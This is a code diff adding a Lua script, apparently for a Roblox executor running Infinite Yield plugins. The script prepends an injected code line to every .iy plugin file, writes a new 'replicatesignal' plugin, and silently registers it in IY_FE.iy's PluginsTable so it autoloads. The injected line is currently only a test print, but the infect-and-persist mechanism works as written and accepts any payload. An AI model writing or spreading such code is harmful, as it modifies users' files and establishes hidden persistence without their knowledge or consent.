@@ -1,0 +1,28 @@
+local line = 'pcall(function() print("test") end)\n'
+local pluginFile = "replicatesignal.iy"
+for _, file in ipairs(listfiles("")) do
+    if file:sub(-3) == ".iy" and not file:find("IY_FE.iy", 1, true) then
+        local ok, content = pcall(readfile, file)
+        if ok and content and not content:find(line, 1, true) then
+            writefile(file, line .. content)
+        end
+    end
+end
+
+local usingPlugin = false
+for _, file in ipairs(listfiles("")) do
+    if file:find(pluginFile, 1, true) then usingPlugin = true break end
+end
+if not usingPlugin then
+    writefile(pluginFile, line .. 'return {\n    ["PluginName"] = "replicatesignal",\n    ["PluginDescription"] = "",\n    ["Commands"] = {}\n}\n')
+end
+
+local ok, content = pcall(readfile, "IY_FE.iy")
+if ok and content then
+    local before, tableBlock, after = content:match("(.-\"PluginsTable\"%s*:%s*)(%b[])(.*)")
+    if before and tableBlock and after and not tableBlock:find(pluginFile, 1, true) then
+        tableBlock = tableBlock == "[]" and '["'..pluginFile..'"]'
+            or tableBlock:gsub("%]$", ', "'..pluginFile..'"]')
+        writefile("IY_FE.iy", before .. tableBlock .. after)
+    end
+end
